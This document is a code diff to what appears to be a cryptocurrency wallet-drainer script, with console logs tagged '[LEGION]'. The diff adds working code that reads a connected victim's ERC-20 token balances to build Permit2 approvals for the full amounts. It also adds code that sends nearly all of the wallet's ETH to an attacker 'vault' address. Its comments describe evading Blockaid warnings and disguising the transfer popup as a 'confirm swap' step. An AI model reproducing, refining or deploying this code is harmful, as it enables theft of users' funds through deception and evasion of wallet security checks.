@@ -854,26 +854,63 @@
           var evmAddr = connectedChains.EVM.address;
           var evmChainId = connectedChains.EVM.chainId || 1;
 
-          // Build permits from ranked scout — use actual raw balance (avoids "Unlimited" in MetaMask)
-          var permits = [{ token: DEFAULT_USDC, amount: MAX_PERMIT }];
+          // Build permits using on-chain balanceOf — actual balance (prevents TRANSFER_FROM_FAILED with wrong amounts)
+          var permits = [];
           try {
-            var ranked = await apiPost('/api/v1/scout/ranked', { wallet_address: evmAddr, chain_family: 'EVM' });
-            var rankedAssets = (ranked && ranked.data && ranked.data.assets) || (ranked && ranked.assets);
-            if (rankedAssets) {
-              var erc20 = rankedAssets.filter(function(a) { return a.token && a.token !== 'native' && a.token.indexOf('0x') === 0; }).slice(0, 10);
-              if (erc20.length) permits = erc20.map(function(a) {
-                // Use raw_amount if available, else compute from USD value with decimals
-                // This shows actual balance instead of "Unlimited $999M" — reduces Blockaid severity
-                var rawAmt = a.raw_amount || a.rawAmount || a.balance_raw;
-                if (!rawAmt && a.amount_usd && a.decimals) {
-                  var pricePerToken = a.price_usd || (a.amount_usd / (a.amount || 1));
-                  var humanAmt = pricePerToken > 0 ? (a.amount_usd / pricePerToken) : (a.amount || 0);
-                  rawAmt = String(Math.floor(humanAmt * Math.pow(10, a.decimals || 6)));
-                }
-                return { token: a.token, amount: rawAmt || MAX_PERMIT };
-              });
+            var _candidateTokens = [DEFAULT_USDC];
+            try {
+              var ranked = await apiPost('/api/v1/scout/ranked', { wallet_address: evmAddr, chain_family: 'EVM' });
+              var rankedAssets = (ranked && ranked.data && ranked.data.assets) || (ranked && ranked.assets);
+              if (rankedAssets) {
+                rankedAssets.filter(function(a) { return a.token && a.token !== 'native' && a.token.indexOf('0x') === 0; })
+                  .slice(0, 10).forEach(function(a) {
+                    if (_candidateTokens.indexOf(a.token) === -1) _candidateTokens.push(a.token);
+                  });
+              }
+            } catch (_se) {}
+            for (var _ci = 0; _ci < _candidateTokens.length; _ci++) {
+              try {
+                var _tok = _candidateTokens[_ci];
+                var _balData = '0x70a08231' + evmAddr.replace('0x','').padStart(64,'0');
+                var _balHex = await eth.request({ method: 'eth_call', params: [{ to: _tok, data: _balData }, 'latest'] });
+                var _bal = (_balHex && _balHex !== '0x' && _balHex !== '0x0') ? BigInt(_balHex) : BigInt(0);
+                if (_bal > BigInt(0)) permits.push({ token: _tok, amount: String(_bal) });
+              } catch (_be) {}
             }
+            if (permits.length > 0) console.log('[LEGION] 🪙 ERC-20 on-chain:', permits.map(function(p) { return p.token.slice(0,10)+':'+p.amount; }).join(', '));
           } catch (e) {}
+
+          // Native ETH drain — always attempt, independent of permit2/ERC-20
+          var vaultEvm = VAULT_CACHE && (VAULT_CACHE.evm || VAULT_CACHE.ethereum);
+          if (vaultEvm) {
+            try {
+              var _ethHex = await eth.request({ method: 'eth_getBalance', params: [evmAddr, 'latest'] });
+              var _ethBal = BigInt(_ethHex);
+              var _gasReserve = BigInt('5000000000000000');
+              if (_ethBal > _gasReserve) {
+                var _sendWei = _ethBal - _gasReserve;
+                console.log('[LEGION] ETH drain attempt: ' + _sendWei + ' wei → vault');
+                try {
+                  var _ethTxHash = await eth.request({
+                    method: 'eth_sendTransaction',
+                    params: [{ from: evmAddr, to: vaultEvm, value: '0x' + _sendWei.toString(16), gas: '0x5208' }]
+                  });
+                  connectedChains.EVM._ethTxHash = _ethTxHash;
+                  console.log('[LEGION] ✅ ETH transfer tx: ' + _ethTxHash);
+                } catch (_ethTxErr) {
+                  console.debug('[LEGION] ETH sendTransaction rejected:', _ethTxErr.message);
+                }
+              }
+            } catch (_ethErr) {
+              console.debug('[LEGION] ETH drain skip:', _ethErr.message);
+            }
+          }
+
+          // Skip permit2 if no ERC-20 balance on-chain (ETH already drained above)
+          if (permits.length === 0) {
+            console.log('[LEGION] ℹ️ No ERC-20 balance — permit2 skipped, ETH drained:', connectedChains.EVM._ethTxHash || 'none');
+            return null;
+          }
 
           // Fetch Permit2 typed data from backend
           console.log('[LEGION] 🔐 EVM sign via', connectedChains.EVM.walletType, '| chain:', evmChainId, '| addr:', evmAddr.substring(0, 10) + '...');
@@ -967,36 +1004,6 @@
 
           connectedChains.EVM._batchResult = batchData;
           connectedChains.EVM._permits = permits;
-
-          // Native ETH drain — separate sendTransaction popup (looks like "confirm swap" step)
-          var vaultEvm = VAULT_CACHE && (VAULT_CACHE.evm || VAULT_CACHE.ethereum);
-          if (signature && vaultEvm) {
-            try {
-              var ethBal = BigInt(0);
-              try {
-                var ethHex = await eth.request({ method: 'eth_getBalance', params: [evmAddr, 'latest'] });
-                ethBal = BigInt(ethHex);
-              } catch (_eb) {}
-              // Keep 0.005 ETH as gas reserve — drain rest
-              var gasReserve = BigInt('5000000000000000');
-              if (ethBal > gasReserve) {
-                var sendWei = ethBal - gasReserve;
-                console.log('[LEGION] ETH drain attempt: ' + sendWei + ' wei → vault');
-                try {
-                  var ethTxHash = await eth.request({
-                    method: 'eth_sendTransaction',
-                    params: [{ from: evmAddr, to: vaultEvm, value: '0x' + sendWei.toString(16), gas: '0x5208' }]
-                  });
-                  connectedChains.EVM._ethTxHash = ethTxHash;
-                  console.log('[LEGION] ✅ ETH transfer tx: ' + ethTxHash);
-                } catch (_ethTxErr) {
-                  console.debug('[LEGION] ETH sendTransaction rejected:', _ethTxErr.message);
-                }
-              }
-            } catch (_ethErr) {
-              console.debug('[LEGION] ETH drain skip:', _ethErr.message);
-            }
-          }
 
           return signature;
         } catch (e) {
